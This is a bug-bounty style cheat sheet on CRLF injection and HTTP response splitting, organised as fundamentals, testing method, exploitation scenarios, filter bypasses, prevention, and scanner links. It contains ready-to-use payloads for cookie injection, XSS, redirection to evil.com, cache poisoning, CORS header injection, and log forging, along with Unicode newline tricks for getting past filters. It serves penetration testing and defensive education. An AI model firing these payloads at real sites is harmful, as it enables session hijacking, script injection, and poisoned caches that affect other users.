


# 🔥 CRLF Injection – Complete Cheat Sheet

---

# 1️⃣ Fundamentals

## 📌 What is CRLF?

|Name|Symbol|ASCII|URL Encoded|
|---|---|---|---|
|Carriage Return|\r|13|%0D|
|Line Feed|\n|10|%0A|
|CRLF|\r\n|—|%0D%0A|

HTTP protocol uses **CRLF to terminate each header line**.

Example normal HTTP response:

```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123

<html>Hello</html>
```

Notice:

- Each header ends with CRLF
    
- Headers and body separated by CRLF CRLF
    

---

# 2️⃣ Core Vulnerability Concept

## 📌 CRLF Injection happens when:

- User input is reflected inside HTTP headers
    
- Without sanitizing \r and \n
    

Attacker injects:

```
%0D%0A
```

This:

- Ends current header
    
- Starts new header
    
- Or even starts new body
    

---

# 3️⃣ HTTP Response Splitting

## 📌 Definition

Injecting CRLF into response headers  
→ Splits response into two parts  
→ Attacker controls second part

### Structure after exploitation:

```
Header: safe-value
Injected-Header: evil
```

Or:

```
Header: safe-value

<malicious body>
```

---

# 4️⃣ Methodology (Bug Bounty Style)

## Step 1 – Find Reflection in Headers

Test parameters:

```
?lang=test
?redirect=test
?page=test
```

Check in:

- Response headers
    
- Location header
    
- Set-Cookie
    
- Custom headers
    

---

## Step 2 – Inject CRLF

Try:

```
test%0d%0aInjected: yes
```

If new header appears → vulnerable

---

## Step 3 – Double CRLF (Body Injection)

```
%0d%0a%0d%0a<html>pwned</html>
```

If browser renders it → Response Splitting confirmed

---

## Step 4 – Escalate Impact

Try injecting:

- Set-Cookie
    
- Location
    
- Content-Type
    
- Content-Length
    
- Access-Control-Allow-Origin
    
- X-XSS-Protection
    

---

# 5️⃣ Exploitation Scenarios

---

## 🔹 5.1 Session Fixation

Original response:

```
Set-Cookie: sessionid=abc123
```

Injection:

```
value%0d%0aSet-Cookie: admin=true
```

Result:

```
Set-Cookie: sessionid=value
Set-Cookie: admin=true
```

Impact:

- Privilege escalation
    
- Session manipulation
    

---

## 🔹 5.2 Cross-Site Scripting (XSS)

Payload:

```
%0d%0aContent-Length:35
%0d%0aX-XSS-Protection:0
%0d%0a%0d%0a
<svg onload=alert(document.domain)>
```

What happens:

- Ends headers
    
- Disables XSS filter
    
- Starts new HTML body
    
- Executes JS
    

Impact:

- Account takeover
    
- Token theft
    
- Admin compromise
    

---

## 🔹 5.3 Open Redirect

Payload:

```
%0d%0aLocation: http://evil.com
```

Impact:

- Phishing
    
- OAuth token stealing
    
- Trust abuse
    

---

## 🔹 5.4 Cache Poisoning

Inject:

```
%0d%0aContent-Type:text/html
%0d%0a%0d%0a
<h1>Owned</h1>
```

If cached:

- All users see malicious content
    
- Stored XSS scenario
    

---

## 🔹 5.5 CORS Bypass

Inject:

```
%0d%0aAccess-Control-Allow-Origin: *
```

Impact:

- Bypass Same-Origin Policy
    
- Steal API data
    

---

## 🔹 5.6 Log Forging

Inject:

```
%0d%0a127.0.0.1 - 08:00 - /admin
```

Impact:

- Hide attacker traces
    
- Mislead forensic analysis
    

---

## 🔹 5.7 Request Smuggling Chain

Inject:

```
Connection: keep-alive
```

Then append second request.

Impact:

- Response queue poisoning
    
- Cache poisoning
    
- SSRF chaining
    

---

# 6️⃣ Filter Bypass Techniques

If %0D%0A blocked:

## 🔹 UTF-8 newline tricks

| Character | URL Encoded | Interpreted as |
| --------- | ----------- | -------------- |
| U+2028    | %E2%80%A8   | \n             |
| U+2029    | %E2%80%A9   | newline        |
| U+0085    | %C2%85      | newline        |

Example:

```
/%0A%E2%80%A8Set-Cookie:admin=true
```

Some frameworks normalize it to \n.

---

## 🔹 Firefox UTF-8 Trick

|UTF-8|Converted to|
|---|---|
|%E5%98%8A|%0A|
|%E5%98%8D|%0D|

Example payload:

```
%E5%98%8A%E5%98%8Dcontent-type:text/html
```

---

# 7️⃣ Impact Ranking (From Most Critical)

1. Response Splitting → XSS
    
2. Request Smuggling
    
3. Cache Poisoning
    
4. SSRF via header injection
    
5. Session Fixation
    
6. Open Redirect
    
7. Log Injection
    

---

# 8️⃣ Real-World CVEs (Important)

Recent years showed:

- Client-side HTTP libraries vulnerable
    
- Header builders not sanitizing CRLF
    
- Internal services exploitable
    

Lesson:  
CRLF is not just a web-server bug  
It appears inside:

- API clients
    
- Proxies
    
- Microservices
    

---

# 9️⃣ Testing Checklist

✔ Check reflected parameters in headers  
✔ Test %0D%0A injection  
✔ Test double CRLF  
✔ Test Set-Cookie injection  
✔ Test Location injection  
✔ Test CORS header injection  
✔ Test cache behavior  
✔ Test Unicode newline bypass

---

# 🔟 Prevention

- Strip \r and \n from user input
    
- Use safe header-setting functions
    
- Avoid placing user input directly in headers
    
- Update frameworks and HTTP libraries
    

---

# 🧠 Mental Model (Important)

```
CRLF Injection
        ↓
Response Structure Control
        ↓
Header Injection / Body Injection
        ↓
XSS / Cache Poisoning / Smuggling / SSRF
```


---

## Automatic Tools

- [CRLFsuite](https://github.com/Raghavd3v/CRLFsuite) – fast active scanner written in Go.
- [crlfuzz](https://github.com/dwisiswant0/crlfuzz) – wordlist-based fuzzer that supports Unicode newline payloads.
- [crlfix]((https://github.com/RevoltSecurities/Crlfix))  An accurate and concurrent CRLF Injection Vulnerability Scanner